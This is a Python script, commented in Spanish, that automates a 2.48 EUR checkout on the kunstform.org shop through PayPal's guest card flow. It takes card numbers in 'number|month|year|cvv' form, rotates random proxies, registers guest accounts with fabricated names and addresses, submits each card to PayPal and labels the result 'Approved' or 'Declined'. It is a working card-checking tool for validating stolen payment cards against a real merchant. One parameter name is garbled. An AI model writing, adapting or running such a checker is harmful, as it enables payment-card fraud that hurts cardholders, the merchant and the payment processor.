from requests import Session
from srca.defgates import ConfigsPAge
from dataclasses import dataclass
from proxys.proxys import get_random_proxy

@dataclass
class PaypalKunstform:
    """Clase dedicada al procesamiento de pagos en kunstform.org mediante PayPal (2.48 EUR)."""

    def main(self, card: str) -> tuple[str, str]:
        """Procesa una tarjeta para un cargo de 2.48 EUR en kunstform.org."""
        try:
            self.session = Session()
            self.ccs = card.split('|')

            # Determinar la marca de la tarjeta
            if self.ccs[0].startswith("4"):
                self.brand = "VISA"
            elif self.ccs[0].startswith("3"):
                self.brand = "AMEX"
            elif self.ccs[0].startswith("6"):
                self.brand = "DISCOVER"
            elif self.ccs[0].startswith("5"):
                self.brand = "MASTERCARD"
            else:
                return "Declined! ❌", "Unsupported card type"

            # Configurar proxy aleatorio desde proxys/proxys.py
            self.session.proxies.update(get_random_proxy())

            # Paso 1: Visitar página del producto
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            self.session.get(
                'https://www.kunstform.org/en/kunstform-team-2025-florian-foerst-bmx-poster-420-594-mm-din-a2-p-28166',
                headers=headers
            )

            # Paso 2: Añadir producto al carrito
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.kunstform.org',
                'Referer': 'https://www.kunstform.org/en/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            params = {'action': 'add_product', 'language': 'en'}
            data = {'attrcomb': '', 'quantity': '1', 'options': '', 'products_id': '28166'}
            self.session.post(
                'https://www.kunstform.org/en/kunstform-team-2025-florian-foerst-bmx-poster-420-594-mm-din-a2-p-28166',
                params=params, headers=headers, data=data
            )

            # Paso 3: Ir al carrito
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Referer': 'https://www.kunstform.org/en/kunstform-team-2025-florian-foerst-bmx-poster-420-594-mm-din-a2-p-28166',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            self.session.get('https://www.kunstform.org/en/shopping_cart.php', headers=headers)

            # Paso 4: Ir a checkout
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Referer': 'https://www.kunstform.org/en/shopping_cart.php',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            self.session.get('https://www.kunstform.org/en/checkout/', headers=headers)

            # Paso 5: Crear cuenta de invitado
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Referer': 'https://www.kunstform.org/en/login.php?origin=checkout.php',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            self.session.get('https://www.kunstform.org/en/create_account.php', params={'guest_account': 'true'}, headers=headers)

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.kunstform.org',
                'Referer': 'https://www.kunstform.org/en/create_account.php?guest_account=true',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            data = {
                'action': 'process', 'guest_account': '1', 'company': '', 'firstname': 'Lucas', 'lastname': 'Lorenzo',
                'street_address': 'E Little York Rd 7912', 'suburb': 'Norman', 'city': 'Norman', 'postcode': '10010',
                'country': '223', 'zone_id': '43', 'email_address': 'valerie.jenkins@gmail.com', 'telephone': '8194544131',
                'agreement': '1'
            }
            self.session.post('https://www.kunstform.org/en/create_account.php', headers=headers, data=data)

            # Paso 6: Seleccionar método de envío
            headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://www.kunstform.org',
                'Referer': 'https://www.kunstform.org/en/checkout/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            self.session.patch('https://www.kunstform.org/en/checkout/shipping', headers=headers, json={'method': 'spu_stuttgart'})

            # Paso 7: Obtener parámetros de PayPal
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://www.kunstform.org/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            params = {
                'style.label': 'buynow', ' 对象style.layout': 'horizontal', 'style.shape': 'rect', 'style.tagline': 'false',
                'style.menuPlacement': 'below', 'fundingSource': 'card', 'allowBillingPayments': 'true',
                'applePaySupport': 'false', 'buttonSessionID': 'uid_8fbbb7b60e_mtc6ndq6mte', 'buttonSize': 'huge',
                'customerId': '', 'clientID': 'AcV1XiLcC2qiAwSv_mq1SPe99nT233j18ROl8To0gdeohfJXNGBhEanHdsV6xV6yV7VJXzEMWjT51Ftk',
                'clientMetadataID': 'uid_1ad1deb90b_mtc6ndq6mdy', 'commit': 'true', 'components.0': 'buttons',
                'components.1': 'funding-eligibility', 'components.2': 'marks', 'components.3': 'messages', 'currency': 'EUR',
                'debug': 'false', 'disableSetCookie': 'true', 'env': 'production', 'experiment.enableVenmo': 'false',
                'experiment.venmoVaultWithoutPurchase': 'false', 'experiment.venmoWebEnabled': 'false',
                'experiment.isPaypalRebrandEnabled': 'false', 'experiment.defaultBlueButtonColor': 'defaultBlue_darkBlue',
                'experiment.venmoEnableWebOnNonNativeBrowser': 'false', 'flow': 'purchase',
                'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hZXN0cm8iOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpbmVycyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY3VwIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6dHJ1ZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ',
                'intent': 'capture', 'locale.lang': 'en', 'locale.country': 'US', 'hasShippingCallback': 'false',
                'platform': 'desktop', 'renderedButtons.0': 'card', 'sessionID': 'uid_1ad1deb90b_mtc6ndq6mdy',
                'sdkCorrelationID': 'prebuild',
                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWNWMVhpTGNDMnFpQXdTdl9tcTFTUGU5OW5UMjMzajE4Uk9sOFRvMGdkZW9oZkpYTkdCaEVhbkhkc1Y2eFY2eVY3VkpYekVNV2pUNTFGdGsmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWFya3MsbWVzc2FnZXMmY3VycmVuY3k9RVVSJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2lzbWFpZ25oaXFld2V3cmZkamxmYnRxY3Ryc2lsbCJ9fQ',
                'sdkVersion': '5.0.474', 'storageID': 'uid_87d375ce0d_mtc6ndq6mdy', 'supportedNativeBrowser': 'false',
                'supportsPopups': 'true', 'vault': 'false'
            }
            response = self.session.get('https://www.paypal.com/smart/buttons', params=params, headers=headers)
            sdkMeta = ConfigsPAge().QueryText(response.text, '"sdkMeta":"', '"')
            facilitatorAccessToken = ConfigsPAge().QueryText(response.text, 'facilitatorAccessToken":"', '"')

            # Paso 8: Crear orden en PayPal
            headers = {
                'accept': 'application/json',
                'authorization': f'Bearer {facilitatorAccessToken}',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'paypal-partner-attribution-id': '',
                'prefer': 'return=representation',
                'referer': f'https://www.paypal.com/smart/buttons?style.label=buynow&style.layout=horizontal&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=card&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_8fbbb7b60e_mtc6ndq6mte&buttonSize=huge&customerId=&clientID=AcV1XiLcC2qiAwSv_mq1SPe99nT233j18ROl8To0gdeohfJXNGBhEanHdsV6xV6yV7VJXzEMWjT51Ftk&clientMetadataID=uid_1ad1deb90b_mtc6ndq6mdy&commit=true&components.0=buttons&components.1=funding-eligibility&components.2=marks&components.3=messages¤cy=EUR&debug=false&disableSetCookie=true&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=defaultBlue_darkBlue&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImhpcGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sImpjYiI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hZXN0cm8iOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpbmVycyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiY3VwIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiY2JfbmF0aW9uYWxlIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRaYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6dHJ1ZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvYmFuY2FyaW8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfSwibXVsdGliYW5jbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&intent=capture&locale.lang=en&locale.country=US&hasShippingCallback=false&platform=desktop&renderedButtons.0=card&sessionID=uid_1ad1deb90b_mtc6ndq6mdy&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWNWMVhpTGNDMnFpQXdTdl9tcTFTUGU5OW5UMjMzajE4Uk9sOFRvMGdkZW9oZkpYTkdCaEVhbkhkc1Y2eFY2eVY3VkpYekVNV2pUNTFGdGsmY29tcG9uZW50cz1idXR0b25zLGZ1bmRpbmctZWxpZ2liaWxpdHksbWFya3MsbWVzc2FnZXMmY3VycmVuY3k9RVVSJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2lzbWFpZ25oaXFld2V3cmZkamxmYnRxY3Ryc2lsbCJ9fQ&sdkVersion=5.0.474&storageID=uid_87d375ce0d_mtc6ndq6mdy&supportedNativeBrowser=false&supportsPopups=true&vault=false',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            json_data = {
                'payer': {
                    'email_address': 'valerie.jenkins@gmail.com',
                    'address': {
                        'address_line_1': 'E Little York Rd 7912 Norman',
                        'admin_area_1': None,
                        'admin_area_2': 'Norman',
                        'postal_code': '10010',
                        'country_code': 'US',
                    },
                    'name': {
                        'given_name': 'Lucas',
                        'surname': 'Lorenzo',
                    },
                },
                'purchase_units': [
                    {
                        'amount': {
                            'breakdown': {
                                'item_total': {'currency_code': 'EUR', 'value': '2.48'},
                                'tax_total': {'currency_code': 'EUR', 'value': '0.00'},
                                'shipping': {'currency_code': 'EUR', 'value': '0.00'},
                                'handling': {'currency_code': 'EUR', 'value': '0.00'},
                                'discount': {'currency_code': 'EUR', 'value': '0.00'},
                            },
                            'currency_code': 'EUR',
                            'value': '2.48',
                        },
                        'items': [
                            {
                                'name': 'kunstform "Team 2025 Florian Först" BMX Poster - 420 × 594 mm (DIN A2)',
                                'quantity': 1,
                                'unit_amount': {'currency_code': 'EUR', 'value': 2.48},
                                'tax': {'currency_code': 'EUR', 'value': 0},
                            },
                        ],
                        'shipping': {
                            'name': {'full_name': 'Lucas Lorenzo'},
                            'address': {
                                'address_line_1': 'E Little York Rd 7912 Norman',
                                'admin_area_1': None,
                                'admin_area_2': 'Norman',
                                'postal_code': '10010',
                                'country_code': 'US',
                            },
                            'type': 'SHIPPING',
                        },
                    },
                ],
                'application_context': {
                    'user_action': 'CONTINUE',
                    'shipping_preference': 'SET_PROVIDED_ADDRESS',
                },
                'intent': 'CAPTURE',
            }
            response = self.session.post('https://www.paypal.com/v2/checkout/orders', headers=headers, json=json_data)
            response.raise_for_status()
            id_orden = response.json()['id']

            # Paso 9: Enviar datos de la tarjeta
            headers = {
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'paypal-client-context': id_orden,
                'paypal-client-metadata-id': id_orden,
                'referer': f'https://www.paypal.com/smart/card-fields?sessionID=uid_3043464d71_mtc6mju6mzy&buttonSessionID=uid_20b7020337_mtc6mjk6mdg&locale.x=en_US&commit=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta={sdkMeta}&disable-card=&token={id_orden}',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-app-name': 'standardcardfields',
                'x-country': 'US'
            }
            json_data = {
                'query': '''
                    mutation payWithCard(
                        $token: String!
                        $card: CardInput!
                        $phoneNumber: String
                        $firstName: String
                        $lastName: String
                        $shippingAddress: AddressInput
                        $billingAddress: AddressInput
                        $email: String
                        $currencyConversionType: CheckoutCurrencyConversionType
                        $installmentTerm: Int
                        $identityDocument: IdentityDocumentInput
                    ) {
                        approveGuestPaymentWithCreditCard(
                            token: $token
                            card: $card
                            phoneNumber: $phoneNumber
                            firstName: $firstName
                            lastName: $lastName
                            email: $email
                            shippingAddress: $shippingAddress
                            billingAddress: $billingAddress
                            currencyConversionType: $currencyConversionType
                            installmentTerm: $installmentTerm
                            identityDocument: $identityDocument
                        ) {
                            flags { is3DSecureRequired }
                            cart {
                                intent
                                cartId
                                buyer { userId auth { accessToken } }
                                returnUrl { href }
                            }
                            paymentContingencies {
                                threeDomainSecure {
                                    status
                                    method
                                    redirectUrl { href }
                                    parameter
                                }
                            }
                        }
                    }
                ''',
                'variables': {
                    'token': id_orden,
                    'card': {
                        'cardNumber': self.ccs[0],
                        'type': self.brand,
                        'expirationDate': f'{self.ccs[1]}/{self.ccs[2]}',
                        'postalCode': '10010',
                        'securityCode': self.ccs[3],
                    },
                    'phoneNumber': '8194544131',
                    'firstName': 'Lucas',
                    'lastName': 'Lorenzo',
                    'billingAddress': {
                        'givenName': 'Lucas',
                        'familyName': 'Lorenzo',
                        'line1': 'E Little York Rd 7912 Norman',
                        'line2': None,
                        'city': 'Norman',
                        'state': 'NY',
                        'postalCode': '10010',
                        'country': 'US',
                    },
                    'email': 'valerie.jenkins@gmail.com',
                    'currencyConversionType': 'PAYPAL',
                },
                'operationName': None,
            }
            response = self.session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
            ConfigsPAge().SaveResponseHhml(response.text)

            # Procesar respuesta
            if '"errors"' in response.text:
                if 'EXISTING_ACCOUNT_RESTRICTED' in response.text:
                    return 'Approved! ✅', 'EXISTING_ACCOUNT_RESTRICTED'
                else:
                    error_code = response.json().get('errors', [{}])[0].get('data', [{}])[0].get('code', 'Unknown Error')
                    return 'Declined! ❌', error_code
            else:
                return 'Approved! ✅', 'Charged 2.48 EUR'

        except Exception as e:
            return 'Error ⚠️', f'Failed to process: {str(e)}'